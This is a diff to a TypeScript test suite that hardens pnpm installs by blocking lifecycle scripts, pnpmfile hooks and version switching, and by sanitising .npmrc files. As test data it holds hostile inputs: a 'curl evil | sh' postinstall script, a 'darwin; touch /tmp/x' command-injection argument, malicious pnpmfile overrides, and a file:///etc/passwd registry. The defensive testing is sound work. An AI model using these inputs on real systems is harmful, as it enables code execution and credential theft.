@@ -7,15 +7,24 @@ import {
   findBuildStepPackages,
   findDisallowedDependencies,
   findLeftoverLinks,
+  findManifestCodeLoading,
   findNormalizationTargets,
+  findWorkspaceCodeLoading,
   isRegistryResolution,
-  stripLifecycleScripts,
+  stageManifest,
+  stageNpmrc,
   type TreeEntry,
 } from './install-args.js';
 import { TARGETS } from './targets.js';
 
-const COMMON = ['--frozen-lockfile', '--prod', '--ignore-scripts'];
+const COMMON = [
+  '--frozen-lockfile',
+  '--prod',
+  '--ignore-scripts',
+  '--ignore-pnpmfile',
+];
 const CONFIG = [
+  '--config.pm-on-fail=ignore',
   '--config.node-linker=hoisted',
   '--config.side-effects-cache=false',
   '--config.package-import-method=copy',
@@ -80,6 +89,14 @@ describe('buildPnpmInstallArgs', () => {
         ).toBe(false);
         expect(args).toContain('--config.side-effects-cache=false');
       }
+    }
+  });
+
+  it('always ignores pnpmfile hooks and never lets pnpm switch versions', () => {
+    for (const spec of TARGETS) {
+      const args = buildPnpmInstallArgs({ target: spec });
+      expect(args).toContain('--ignore-pnpmfile');
+      expect(args).toContain('--config.pm-on-fail=ignore');
     }
   });
 
@@ -152,6 +169,11 @@ describe('assertInstallSafe', () => {
       ['add', ...args.slice(1)],
       args.map((a) => (a === 'darwin' ? 'darwin; touch /tmp/x' : a)),
       args.filter((a) => !a.startsWith('--config.side-effects')),
+      args.filter((a) => a !== '--ignore-pnpmfile'),
+      args.filter((a) => a !== '--config.pm-on-fail=ignore'),
+      [...args, '--no-ignore-pnpmfile'],
+      [...args, '--pnpmfile', 'evil.cjs'],
+      [...args, '--config.pnpmfile=evil.cjs'],
     ];
     for (const candidate of tampered) {
       expect(() => assertInstallSafe(candidate, env)).toThrow(
@@ -252,10 +274,151 @@ describe('dependency policy', () => {
       scripts: { postinstall: 'curl evil | sh', build: 'x' },
       dependencies: { a: '^1' },
     });
-    const staged = stripLifecycleScripts(manifest);
+    const staged = stageManifest(manifest);
     expect(staged).toEqual({ name: 'app', dependencies: { a: '^1' } });
     expect(staged).not.toHaveProperty('scripts');
     expect(manifest.scripts.postinstall).toBe('curl evil | sh');
+  });
+
+  it('removes packageManager and devEngines so pnpm cannot switch to another version', () => {
+    const manifest = Object.freeze({
+      name: 'app',
+      packageManager: 'pnpm@9.0.0+sha512.abc',
+      devEngines: { packageManager: { name: 'pnpm', version: '9.0.0' } },
+      dependencies: { a: '^1' },
+    });
+    const staged = stageManifest(manifest);
+    expect(staged).toEqual({ name: 'app', dependencies: { a: '^1' } });
+    expect(manifest.packageManager).toBe('pnpm@9.0.0+sha512.abc');
+  });
+});
+
+describe('pnpm configuration that would load code', () => {
+  it('finds configDependencies, pnpmfile and globalPnpmfile in the workspace file', () => {
+    expect(
+      findWorkspaceCodeLoading('configDependencies:\n  x: 1.0.0+sha512-abc\n'),
+    ).toEqual(['configDependencies']);
+    expect(findWorkspaceCodeLoading('pnpmfile: ./hooks.cjs\n')).toEqual([
+      'pnpmfile',
+    ]);
+    expect(findWorkspaceCodeLoading('globalPnpmfile: /x/y.cjs\n')).toEqual([
+      'globalPnpmfile',
+    ]);
+  });
+
+  it('finds them nested, quoted, in flow style, kebab-cased or in another case', () => {
+    for (const yaml of [
+      'settings:\n  nested:\n    pnpmfile: a.cjs\n',
+      '"pnpmfile": a.cjs\n',
+      "'config-dependencies':\n  x: 1\n",
+      'a: {b: 1, pnpmfile: x.cjs}\n',
+      'x: ["a #", {global-pnpmfile: x}]\n',
+      'PnpmFile: x.cjs\n',
+      '? pnpmfile\n: x.cjs\n',
+      'anchor: &k pnpmfile\n',
+    ]) {
+      expect(findWorkspaceCodeLoading(yaml), yaml).not.toEqual([]);
+    }
+  });
+
+  it('fails closed on a quoted key spelled with an escape', () => {
+    expect(findWorkspaceCodeLoading('"pnpm\\x66ile": a.cjs\n')).toEqual([
+      'escaped YAML key',
+    ]);
+  });
+
+  it('ignores comments and ordinary settings', () => {
+    expect(
+      findWorkspaceCodeLoading(
+        [
+          '# pnpmfile: not used',
+          'packages: []',
+          'overrides:',
+          '  lodash: 4.17.21',
+          'onlyBuiltDependencies:',
+          '  - esbuild',
+          '',
+        ].join('\n'),
+      ),
+    ).toEqual([]);
+  });
+
+  it('finds them under the manifest pnpm field and never reports a dependency named like them', () => {
+    expect(
+      findManifestCodeLoading({
+        pnpm: { overrides: {}, nested: { 'global-pnpmfile': 'x.cjs' } },
+      }),
+    ).toEqual(['globalPnpmfile']);
+    expect(findManifestCodeLoading({ pnpmfile: 'x.cjs' })).toEqual([
+      'pnpmfile',
+    ]);
+    expect(
+      findManifestCodeLoading({ dependencies: { pnpmfile: '^1.0.0' } }),
+    ).toEqual([]);
+  });
+});
+
+describe('stageNpmrc', () => {
+  it('keeps registry lines and four boolean resolution settings only', () => {
+    const staged = stageNpmrc(
+      [
+        '# comment',
+        'registry = https://registry.example.com/',
+        '@acme:registry=https://npm.acme.test/',
+        'auto-install-peers=false',
+        'strict-peer-dependencies=maybe',
+        'node-linker=hoisted',
+        'store-dir=/tmp/evil',
+        'script-shell=/tmp/evil.sh',
+        '//registry.example.com/:_authToken=NOT-A-REAL-TOKEN',
+        '_auth=abc',
+        'registry=https://user:pass@registry.example.com/',
+        '@bad:registry=${REGISTRY_URL}',
+        'registry=file:///etc/passwd',
+        'noequals',
+        '',
+      ].join('\n'),
+    );
+    expect(staged.text).toBe(
+      [
+        'registry=https://registry.example.com/',
+        '@acme:registry=https://npm.acme.test/',
+        'auto-install-peers=false',
+        '',
+      ].join('\n'),
+    );
+    expect(staged.dropped).toBe(10);
+    expect(staged.text).not.toContain('NOT-A-REAL-TOKEN');
+  });
+
+  it('stages nothing for a credentials-only file', () => {
+    expect(stageNpmrc('//r.example/:_authToken=x\n')).toEqual({
+      text: '',
+      dropped: 1,
+    });
+    expect(stageNpmrc('')).toEqual({ text: '', dropped: 0 });
+  });
+
+  it('fails on pnpmfile, global-pnpmfile and config-dependencies keys without echoing values', () => {
+    for (const line of [
+      'pnpmfile=./evil.cjs',
+      'global-pnpmfile = /tmp/evil.cjs',
+      'GLOBAL_PNPMFILE=/tmp/evil.cjs',
+      'config-dependencies=x',
+    ]) {
+      let thrown: unknown;
+      try {
+        stageNpmrc(`registry=https://r.example/\n${line}\n`);
+      } catch (error) {
+        thrown = error;
+      }
+      expect(thrown, line).toMatchObject({
+        code: 'unsafe_install_config',
+        category: 'invalid_input',
+        field: '.npmrc',
+      });
+      expect(JSON.stringify(thrown)).not.toContain('evil');
+    }
   });
 });
 
